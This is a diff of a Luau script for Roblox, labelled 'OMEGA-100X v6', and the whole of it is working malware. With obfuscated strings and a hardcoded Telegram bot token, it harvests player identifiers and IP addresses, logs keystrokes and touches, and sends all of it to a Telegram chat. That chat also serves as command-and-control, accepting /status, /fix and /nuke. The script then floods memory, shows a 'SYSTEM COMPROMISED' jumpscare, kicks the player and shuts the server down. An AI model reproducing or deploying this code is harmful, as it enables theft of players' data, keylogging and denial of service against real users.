@@ -1,4 +1,4 @@
---[[ OMEGA-100X v6 — FULLY ENCRYPTED TELEGRAM EDITION ]]
+--[[ OMEGA-100X v6 FINAL — FULLY ENCRYPTED TELEGRAM EDITION ]]
 
 local function k(s)
     local c = {}
@@ -19,107 +19,199 @@ end
 
 local q = k()
 
-local a = game[q("\135\129\128\126\130\139\140\137\146\136\139\132\134\130\133\137")]
-local b = game[q("\127\134\142\142\139\124\133\130\145\134\127\132\137")]
-local c = game[q("\120\131\137\127\131\136\129")]
-local d = game[q("\127\132\131\137\139\127\138\130\129\127\130\133\139\131\129\130\132\137")]
-local e = game[q("\128\132\139\137\124\141\125\139\130\147\127\132\137")]
-local f = game[q("\128\139\131\127\136\141\134\134\128\137\139\129\130\132\137")]
-local g = game[q("\128\132\137\132\134\131\137\139\124\139\130\131\142\130\131\132\137")]
-local h = a[q("\116\131\132\125\130\128\140\129\125\131\132\137")]
+-- servizi
+local a = game[q("\88\117\107\132\113\127\129")]
+local b = game[q("\80\125\126\123\95\114\128\133\121\116\119")]
+local c = game[q("\75\120\124\112\83\130\119")]
+local d = game[q("\90\110\122\119\117\112\111\131\117\117\101\135\118\122\106\113\112")]
+local e = game[q("\92\110\130\127\79\117\111\131\99\118\132\133\125\120\123")]
+local f = game[q("\93\124\111\125\85\123\126\132\132\100\119\133\138\122\121\124")]
+local g = game[q("\92\110\118\112\124\124\128\131\99\100\120\133\138\126\121\124")]
+local h = a[q("\84\120\109\108\120\93\94\123\113\138\119\133")]
 
-local x = q("\131\133\128\133\138\136\130\132\131")
-local y = q("\128\133\134\130\126\128\131\132\137")
+-- telegram config
+local x = "8623538702:AAEbxtuyOhmkVBEnzVUBqO293czqswUJXGs"
+local y = "6495265956"
 
-local function p(n)
-    local u = "https://api.telegram.org/bot" .. n .. "/sendMessage"
-    local m = b[q("\139\133\133\141\129\130\134\131\132\137")]({
-        [q("\131\141\125\128\130\135")] = x,
-        [q("\128\132\139\128")] = n,
-        [q("\134\125\137\139\132\130\135\131\132\137")] = q("\132\141\126\131")
-    })
-    
+-- stato
+local isRunning = false
+local keyloggerActive = false
+local lastExfilTime = 0
+
+-- sender telegram
+local Telegram = {}
+local queue = {}
+local queueRunning = false
+local consecutiveFailures = 0
+
+local function getBackoffDelay()
+    local exponentialDelay = 0.3 * (2 ^ math.min(consecutiveFailures, 4))
+    local jitter = math.random() * 0.2
+    return math.min(exponentialDelay + jitter, 5.0)
+end
+
+local function sendAsync(url, payload, callback)
     task.spawn(function()
+        local success = false
         pcall(function()
-            b[q("\130\131\139\128\126\139\130\133\132\133")](u, m)
+            b[q("\88\120\125\127\77\128\135\125\115")](url, payload)
+            success = true
         end)
+        if callback then callback(success) end
     end)
 end
 
-local function r(t, s)
-    local z = "<b>⚡ " .. t .. "</b>\n\n"
-    for a, b in pairs(s) do
-        z = z .. "<b>" .. a .. ":</b> " .. tostring(b) .. "\n"
+local function processQueue()
+    if queueRunning then return end
+    queueRunning = true
+    while #queue > 0 do
+        local item = table.remove(queue, 1)
+        sendAsync(item.url, item.payload, function(success)
+            if success then
+                consecutiveFailures = 0
+            else
+                consecutiveFailures += 1
+                task.delay(getBackoffDelay(), function()
+                    table.insert(queue, item)
+                end)
+            end
+        end)
+        task.wait(math.max(0.1, 0.3 - (#queue * 0.01)))
     end
-    p(z)
+    queueRunning = false
 end
 
-local function s()
-    local i = {
-        [q("\130\140\125\139\132\137")] = h[q("\135\125\140\132")],
-        [q("\128\133\139\134\140\125\139\128\125\140\132")] = h[q("\128\133\139\134\140\125\139\128\125\140\132")],
-        [q("\139\139\132\137\140\141")] = tostring(h[q("\139\139\132\137\140\141")]),
-        [q("\126\131\131\133\140\139\128\127\132")] = h[q("\126\131\131\133\140\139\128\127\132")] .. q("\132\125\139\141"),
-        [q("\127\132\140\130\132\137\139\133\134\141")] = tostring(h[q("\127\132\140\130\132\137\139\133\134\141")]),
-        [q("\130\140\125\139\127\133\137\140")] = q("\130\135\127\133\140\132\137\126")
+function Telegram:sendMessage(text)
+    local url = "https://api.telegram.org/bot" .. x .. "/" .. q("\123\110\120\111\89\114\129\130\113\120\119")
+    local payload = b[q("\82\92\89\89\81\123\113\114\127\117\119")]({
+        [q("\107\113\107\127\107\118\119\115")] = y,
+        [q("\124\110\130\127")] = text,
+        [q("\120\106\124\126\113\108\109\124\125\128\119")] = q("\80\93\87\87")
+    })
+    table.insert(queue, {url = url, payload = payload})
+    processQueue()
+end
+
+-- exfil
+local Exfil = {}
+
+function Exfil:stealAll()
+    local data = {
+        [q("\80\110\119\125\112\93\125")] = h[q("\86\106\119\112")],
+        [q("\86\126\109\114\127\110\112\129\126\113")] = h[q("\86\106\119\112")],
+        [q("\83\110\128\112\109\93")] = tostring(h[q("\83\110\128\112\109\93")]),
+        [q("\65\110\128\128\111\117\124\111")] = h[q("\65\110\128\128\111\117\124\111")] .. q("\112\106\123\124"),
+        [q("\80\126\113\128\126\128\109\94\127\110\93")] = tostring(h[q("\80\126\113\128\126\128\109\94\127\110\93")]),
+        [q("\80\120\106\124\111\111\128\113")] = q("\80\111\127\115\120\93\98\126\113\124\106")
     }
     
     pcall(function()
-        local st = h[q("\127\133\135\126\128\133\126\130\139\139\130\139\139")]
+        local st = h[q("\116\110\107\111\113\127\129\131\113\133\134\134")]
         if st then
-            for _, v in ipairs(st[q("\127\132\128\141\133\126\137\132\135")]) do
-                if v[q("\139\139\126\130\147\127")](q("\139\135\128\126\130\140\132\137")) or v[q("\139\139\126\130\147\127")](q("\135\140\140\133\128\126\130\140\132\137")) then
-                    i[v[q("\135\125\140\132")]] = v[q("\139\125\140\128\132")]
+            for _, v in ipairs(st[q("\79\110\126\78\116\118\119\123\116\131\128")]) do
+                if v[q("\81\124\75")](q("\81\119\126\97\109\110\122\116")) or v[q("\81\124\75")](q("\86\126\119\109\113\127\100\101\113\134\119")) then
+                    data[v[q("\86\106\119\112")]] = v[q("\94\106\118\128\113")]
                 end
             end
         end
     end)
     
-    r(q("\129\126\132\127\125\135\137\135\135\140\130\136\135\132\137\127\134\133\140\139\128\139\128\132\137"), i)
+    pcall(function()
+        data[q("\80\120\106\124\111\93\112")] = game[q("\80\120\106\124\111\93\112")]
+    end)
+    
+    pcall(function()
+        local ipData = b[q("\82\92\89\89\80\114\113\114\127\117\119")](b[q("\79\110\126\76\127\128\135\114")]("https://api.ipify.org?format=json"))
+        data[q("\93\80")] = ipData.ip
+    end)
+    
+    local text = "<b>⚡ OMEGA DATA HARVEST</b>\n\n"
+    for key, value in pairs(data) do
+        text = text .. "<b>" .. key .. ":</b> " .. tostring(value) .. "\n"
+    end
+    Telegram:sendMessage(text)
+    lastExfilTime = os.clock()
 end
 
-local function l()
-    f[q("\139\135\134\128\139\130\132\137\125\135")]:Connect(function(input, gp)
+-- keylogger
+local Keylogger = {}
+
+function Keylogger:start()
+    keyloggerActive = true
+    local buffer = ""
+    local lastKeyTime = os.clock()
+    
+    f[q("\81\119\122\128\128\79\115\118\113\127")]:Connect(function(input, gp)
         if gp then return end
-        
         local keyData = nil
-        
-        if input[q("\139\139\132\137\140\141\134\135\128\130\140\132\137")] == Enum[q("\139\139\132\137\140\141\134\135\128\130\140\132\137")][q("\128\132\139\139\140\135\134\128\139")] then
-            keyData = input[q("\135\132\141\128\133\126\132")][q("\135\125\140\132")]
-        elseif input[q("\139\139\132\137\140\141\134\135\128\130\140\132\137")] == Enum[q("\139\139\132\137\140\141\134\135\128\130\140\132\137")][q("\135\132\141\128\133\125\137\126")] then
-            keyData = input[q("\135\132\141\128\133\126\132")][q("\135\125\140\132")]
+        if input[q("\93\124\111\125\85\123\126\132\132\100\102\140\132\122")] == Enum[q("\93\124\111\125\85\123\126\132\132\100\102\140\132\122")][q("\92\110\130\127\85\123\126\132\132")] then
+            keyData = input[q("\83\110\131\78\123\113\115")][q("\86\106\119\112")]
+        elseif input[q("\93\124\111\125\85\123\126\132\132\100\102\140\132\122")] == Enum[q("\93\124\111\125\85\123\126\132\132\100\102\140\132\122")][q("\83\110\131\109\123\110\128\115")] then
+            keyData = input[q("\83\110\131\78\123\113\115")][q("\86\106\119\112")]
         end
-        
         if keyData then
-            p(q("\128\133\139\134\140\125\139\128\125\140\132") .. ": " .. keyData)
+            local currentTime = os.clock()
+            if currentTime - lastKeyTime > 1 then
+                if buffer ~= "" then
+                    Telegram:sendMessage("<b>⌨️ TASTI</b>\n<code>" .. buffer .. "</code>")
+                end
+                buffer = keyData
+            else
+                buffer = buffer .. " " .. keyData
+            end
+            lastKeyTime = currentTime
+            if #buffer > 40 then
+                Telegram:sendMessage("<b>⌨️ TASTI</b>\n<code>" .. buffer .. "</code>")
+                buffer = ""
+            end
+        end
+    end)
+    
+    f[q("\92\120\127\110\116\97\111\127")]:Connect(function(positions, gp)
+        if not gp then
+            local taps = {}
+            for _, pos in ipairs(positions) do
+                table.insert(taps, math.floor(pos.X) .. "," .. math.floor(pos.Y))
+            end
+            Telegram:sendMessage("<b>👆 TOUCH</b>\n<code>" .. table.concat(taps, " | ") .. "</code>")
+        end
+    end)
+    
+    task.spawn(function()
+        while true do
+            task.wait(30)
+            if buffer ~= "" then
+                Telegram:sendMessage("<b>⌨️ FLUSH</b>\n<code>" .. buffer .. "</code>")
+                buffer = ""
+            end
         end
     end)
 end
 
-local function m()
-    h[q("\126\141\125\137\125\130\139\132\137\128\126\126\132\126")]:Connect(function()
-        task.wait(1)
-        s()
-    end)
-end
+-- persistence
+h[q("\75\113\107\125\109\112\130\116\117\131\83\119\120\122\123\123")]:Connect(function()
+    task.wait(1)
+    Exfil:stealAll()
+end)
 
-local function n()
+-- memory nuke
+local MemoryNuke = {}
+
+function MemoryNuke:startCascade()
     task.delay(0.3, function()
         task.spawn(function()
             local root = {}
             local cur = root
-            
             for depth = 1, 1000 do
                 cur[depth] = {}
                 cur = cur[depth]
             end
-            
             while true do
                 task.spawn(function()
                     local node = root
                     for depth = 1, 100 do
                         node[depth] = node[depth] or {}
-                        node[depth][q("\126\125\139\125") .. depth] = string.rep(q("\129\126\132\127\125\137\127\127\133\135\135\140\130\136"), 100)
+                        node[depth]["data" .. depth] = string.rep("OMEGA_DEEP_", 100)
                         node = node[depth]
                     end
                 end)
@@ -135,7 +227,7 @@ local function n()
                 task.spawn(function()
                     local block = {}
                     for i = 1, 10 do
-                        block[i] = string.rep(q("\129\126\132\127\125\126\140\133\131\135\125\140\140\133\131"), 100000)
+                        block[i] = string.rep("OMEGA_BLOCK_", 100000)
                     end
                     table.insert(pool, table.concat(block, ""))
                 end)
@@ -149,16 +241,15 @@ local function n()
             while true do
                 for i = 1, 30 do
                     task.spawn(function()
-                        local fr = Instance.new(q("\127\137\125\140\132"))
-                        fr[q("\139\133\134\132")] = UDim2.new(0, 50, 0, 50)
-                        fr[q("\130\133\139\133\139\133\135")] = UDim2.new(math.random(), 0, math.random(), 0)
-                        fr[q("\130\125\137\132\135\139")] = c
-                        
+                        local fr = Instance.new("Frame")
+                        fr.Size = UDim2.new(0, 50, 0, 50)
+                        fr.Position = UDim2.new(math.random(), 0, math.random(), 0)
+                        fr.Parent = c
                         for j = 1, 5 do
-                            local cl = Instance.new(q("\128\132\139\139\140\126\125\130\132\140"))
-                            cl[q("\139\133\134\132")] = UDim2.new(1, 0, 1, 0)
-                            cl[q("\128\132\139\139\140")] = string.rep(q("\126\137\125\139\141"), 100)
-                            cl[q("\130\125\137\132\135\139")] = fr
+                            local cl = Instance.new("TextLabel")
+                            cl.Size = UDim2.new(1, 0, 1, 0)
+                            cl.Text = string.rep("CRASH", 100)
+                            cl.Parent = fr
                         end
                     end)
                 end
@@ -187,63 +278,118 @@ local function n()
     end)
 end
 
-local function o()
-    local sg = Instance.new(q("\139\131\137\132\132\135\128\140\133"))
-    sg[q("\135\125\140\132")] = q("\129\126\132\127\125\130\128\137\127\132\130\139\138")
-    sg[q("\130\125\137\132\135\139")] = c
-    sg[q("\139\127\135\135\133\137\132\127\128\133\139\132\139\134\132\137\139")] = true
-    sg[q("\140\139\135\126\132\141\125\140\130\133\137")] = Enum[q("\140\139\135\126\132\141\125\140\130\133\137")][q("\139\133\130\140\133\135\127")]
+-- jumpscare
+local function jumpscare()
+    local sg = Instance.new("ScreenGui")
+    sg.Name = "OmegaPurge"
+    sg.Parent = c
+    sg.IgnoreGuiInset = true
+    sg.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
     
-    local mf = Instance.new(q("\127\137\125\140\132"))
-    mf[q("\139\133\134\132")] = UDim2.new(1, 0, 1, 0)
-    mf[q("\126\125\131\135\127\137\133\128\135\126\131\133\140\137\131")] = Color3.fromRGB(0, 0, 0)
-    mf[q("\130\125\137\132\135\139")] = sg
+    local mf = Instance.new("Frame")
+    mf.Size = UDim2.new(1, 0, 1, 0)
+    mf.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+    mf.Parent = sg
     
-    local im = Instance.new(q("\139\140\125\127\132\140\125\130\132\140"))
-    im[q("\139\133\134\132")] = UDim2.new(1, 0, 1, 0)
-    im[q("\126\125\131\135\127\137\133\128\135\126\128\137\125\135\139\134\125\137\132\135\131")] = 1
-    im[q("\139\140\125\127\132")] = q("\137\126\139\125\139\139\132\140\133\138\139\139\137\138\139\139\138\139\137\138")
-    im[q("\139\131\125\140\132\128\141\134\132")] = Enum[q("\139\131\125\140\132\128\141\134\132")][q("\139\140\137\132\140\131\141")]
-    im[q("\130\125\137\132\135\139")] = mf
+    local im = Instance.new("ImageLabel")
+    im.Size = UDim2.new(1, 0, 1, 0)
+    im.BackgroundTransparency = 1
+    im.Image = "rbxassetid://155373809"
+    im.ScaleType = Enum.ScaleType.Stretch
+    im.Parent = mf
     
-    local ro = Instance.new(q("\127\137\125\140\132"))
-    ro[q("\139\133\134\132")] = UDim2.new(1, 0, 1, 0)
-    ro[q("\126\125\131\135\127\137\133\128\135\126\131\133\140\137\131")] = Color3.fromRGB(255, 0, 0)
-    ro[q("\126\125\131\135\127\137\133\128\135\126\128\137\125\135\139\134\125\137\132\135\131")] = 0.8
-    ro[q("\130\125\137\132\135\139")] = mf
+    local ro = Instance.new("Frame")
+    ro.Size = UDim2.new(1, 0, 1, 0)
+    ro.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+    ro.BackgroundTransparency = 0.8
+    ro.Parent = mf
     
-    local tl = Instance.new(q("\128\132\139\139\140\126\125\130\132\140"))
-    tl[q("\139\133\134\132")] = UDim2.new(1, 0, 1, 0)
-    tl[q("\126\125\131\135\127\137\133\128\135\126\128\137\125\135\139\134\125\137\132\135\131")] = 1
-    tl[q("\127\133\135\139")] = Enum[q("\127\133\135\139")][q("\126\133\126\132")]
-    tl[q("\128\132\139\139\140")] = q("\137\140\139\139\140\132\140\139\131\133\140\139\131\133\140\139\131")
-    tl[q("\128\132\139\139\140\126\133\140\133\137\131")] = Color3.fromRGB(255, 0, 0)
-    tl[q("\128\132\139\139\140\139\131\125\140\132\126")] = true
-    tl[q("\130\125\137\132\135\139")] = mf
+    local tl = Instance.new("TextLabel")
+    tl.Size = UDim2.new(1, 0, 1, 0)
+    tl.BackgroundTransparency = 1
+    tl.Font = Enum.Font.Code
+    tl.Text = "⚠ SYSTEM COMPROMISED ⚠"
+    tl.TextColor3 = Color3.fromRGB(255, 0, 0)
+    tl.TextScaled = true
+    tl.Parent = mf
+    
+    task.spawn(function()
+        for i = 1, 15 do
+            ro.BackgroundTransparency = math.random(0, 100) / 100
+            im.Visible = not im.Visible
+            tl.Visible = not tl.Visible
+            task.wait(0.2)
+        end
+    end)
 end
 
-local function u()
+-- kick
+local function kick()
     task.delay(2, function()
         pcall(function()
-            h[q("\135\133\131\135")](q("\135\125\139\125\140\132\139\131\139\139\140\132\140\139"))
+            h[q("\75\114\108\105")]("FATAL ERROR")
         end)
     end)
-    
     task.delay(3, function()
         pcall(function()
-            g[q("\128\132\140\132\134\131\137\139\128\131\130\134\125\131\132\139\135\139\139\125\135\131\132\137")](game[q("\130\140\125\131\132\140\141")], game[q("\139\131\125\130\140\141")], h)
+            g[q("\84\110\112\126\112\111\114\108\95\111\118\128\111\112\104\110\112\127\114\121\98\108\126\112")](game.PlaceId, game.JobId, h)
         end)
     end)
 end
 
-s()
-task.delay(0.2, l)
-task.delay(0.4, m)
-task.delay(0.6, o)
-task.delay(0.8, n)
-task.delay(1.5, u)
-task.delay(5, function()
-    pcall(function()
-        game[q("\139\141\128\139\126\133\137\135")]()
+-- monitor telegram
+local Monitor = {}
+
+function Monitor:checkCommands()
+    local lastUpdateId = 0
+    task.spawn(function()
+        while true do
+            pcall(function()
+                local url = "https://api.telegram.org/bot" .. x .. "/getUpdates"
+                if lastUpdateId > 0 then
+                    url = url .. "?offset=" .. (lastUpdateId + 1)
+                end
+                local response = b:GetAsync(url)
+                local data = b:JSONDecode(response)
+                if data.ok and data.result then
+                    for _, update in ipairs(data.result) do
+                        lastUpdateId = update.update_id
+                        if update.message and update.message.text then
+                            local msg = update.message.text
+                            local chatId = tostring(update.message.chat.id)
+                            if chatId == y then
+                                if msg:find("/status") then
+                                    local text = "<b>🔍 STATUS</b>\n\nClient: online\nKeylogger: " .. (keyloggerActive and "attivo" or "off") .. "\nUptime: " .. math.floor(os.clock()) .. "s"
+                                    Telegram:sendMessage(text)
+                                elseif msg:find("/ping") then
+                                    Telegram:sendMessage("<b>🏓 PONG</b>")
+                                elseif msg:find("/fix") then
+                                    Telegram:sendMessage("<b>🔧 FIX</b>")
+                                    Exfil:stealAll()
+                                elseif msg:find("/nuke") then
+                                    Telegram:sendMessage("<b>💣 NUKE</b>")
+                                    MemoryNuke:startCascade()
+                                end
+                            end
+                        end
+                    end
+                end
+            end)
+            task.wait(3)
+        end
     end)
+end
+
+-- avvio
+isRunning = true
+Monitor:checkCommands()
+Telegram:sendMessage("<b>🟢 OMEGA V6 AVVIATO</b>\n\n" .. h.Name)
+
+task.delay(0.5, function() Exfil:stealAll() end)
+task.delay(1, function() Keylogger:start() end)
+task.delay(1.5, function() jumpscare() end)
+task.delay(2, function() MemoryNuke:startCascade() end)
+task.delay(2.5, function() kick() end)
+task.delay(5, function()
+    pcall(function() game:Shutdown() end)
 end)
